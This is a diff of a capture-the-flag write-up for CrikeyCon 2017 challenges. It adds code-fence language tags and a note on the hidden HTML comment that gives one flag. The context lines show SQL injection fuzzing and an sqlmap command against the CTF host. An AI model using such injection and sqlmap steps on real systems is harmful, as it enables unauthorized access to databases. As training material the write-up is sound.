@@ -12,7 +12,7 @@ Submit the flag as: flag{hacker_handle}
 
 Source Code
 
-```
+```html
 HTTP/1.1 200 OK
 Date: Wed, 22 Mar 2017 12:27:07 GMT
 Server: Apache/2.4.18 (Ubuntu)
@@ -28,6 +28,10 @@ Content-Type: text/html
 <title>Cr@pT0l0cK3r</title></head><body background="./matrix-animated-image.gif"></body><center><h1 style=color:red;>U h@v3 b33n h1T by Cr@pT0l0cK3r!</h1><h2 style=color:green;>P@y 1.337 dr0pco1ns 2 @cc0unT: 5318008 1n 1 w33k t0 g3T ur d@T@z b@cK!</h4><img  src="./Hacker.png"><h3 style=color:grey; >*****i l0cK3d ur cr@p******</h1><p style=color:grey; >Gr33Tz to--> TrumpLuV3r, m0l3z, s1Lv10, k0aLaz, Joey Jojo Jr Shabadoo, Team-Barbie, Team Blue Ballz, ASD </p></center><!-- Page made by dr0ppyb3@r_h@ck3r -></html>
 ```
 
+Searching through the source of the compromised website revealed the following commented section:
+```html
+<!-- Page made by dr0ppyb3@r_h@ck3r ->
+```
 
 flag{dr0ppyb3@r_h@ck3r}
 
@@ -39,7 +43,7 @@ Get the flag from this fine collection of bears.
 
 http://ctf.crikeycon.com:8001
 
-```
+```html
 GET / HTTP/1.1
 Host: ctf.crikeycon.com:8001
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -135,7 +139,7 @@ for i in range(num):
 
 
 
-```
+```html
 root@blackhat:/pentest/development/python# python md5sum.py 
 bob = 9f9d51bc70ef21ca5c14f307980a29d8
 =====================================>
@@ -471,7 +475,7 @@ http://ctf.crikeycon.com:8003
 
 ### SQLi Fuzzing
 
-```
+```html
 POST / HTTP/1.1
 Host: ctf.crikeycon.com:8003
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -504,7 +508,7 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 ### SQLMap Exploitation
 
-```
+```html
 root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;'
         ___
        __H__
